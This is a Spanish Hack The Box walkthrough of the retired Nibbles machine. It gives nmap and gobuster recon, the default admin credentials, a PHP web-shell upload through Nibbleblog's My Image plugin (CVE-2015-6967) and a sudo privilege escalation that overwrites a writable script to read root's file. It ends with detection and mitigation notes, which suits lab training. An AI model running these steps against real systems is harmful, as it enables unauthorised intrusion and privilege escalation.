---
machine: Nibbles
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, nibbleblog, file-upload, cve-2015-6967, sudo]
---

# Nibbles — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

CMS **Nibbleblog 4.0.3** en `/nibbleblog/` con credenciales por defecto. El plugin «My Image» **sube ficheros sin validar la extensión** (CVE-2015-6967), así que un PHP se convierte en shell como `nibbler`. La escalada es `sudo` sobre un script del propio usuario que se puede sobrescribir.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp  http  Apache httpd 2.4.18
```

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

`/nibbleblog/` aparece en el listado. La versión se confirma en `/nibbleblog/README` y en el login:

```bash
curl -s http://<IP>/nibbleblog/admin/
curl -s http://<IP>/nibbleblog/content/private/users.xml
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

Login en `/nibbleblog/admin.php` con las credenciales por defecto (`admin:nibbles`; el usuario es `admin`, no el nombre de la máquina). Si no entran, se revisa `content/private/config.xml` y `users.xml`, que suelen ser legibles.

Con sesión de administrador:

1. Plugins → **My Image** → configuración.
2. Subir un `.php` con la shell; la extensión no se valida.
3. El fichero queda en `/nibbleblog/content/private/plugins/my_image/image.php`.

```bash
curl -s "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php?c=id"
# uid=1001(nibbler) ...
```

Reverse shell, y flag de usuario en `/home/nibbler/user.txt`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

El script no existe hasta descomprimir `~/personal.zip` (que crea `personal/stuff/`), y queda `-rwxrwxrwx`, escribible por `nibbler`. Se reemplaza por uno que copie la flag o dé shell:

```bash
cat > /home/nibbler/personal/stuff/monitor.sh <<'EOF'
#!/bin/bash
cp /root/root.txt /tmp/root.txt
chmod 644 /tmp/root.txt
EOF
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
cat /tmp/root.txt
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un CMS con credenciales por defecto y un plugin de subida sin validación es shell en dos pasos.
- CVE-2015-6967 sigue apareciendo en instalaciones antiguas: la versión del CMS es el dato clave.
- Detección: POST a `admin.php` con sesión nueva, `.php` en `content/private/plugins` y `monitor.sh` ejecutado por `sudo`.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Actualizar el CMS, poner un WAF delante y revisar la integridad de los ficheros.

## Referencias

- [CVE-2015-6967](https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
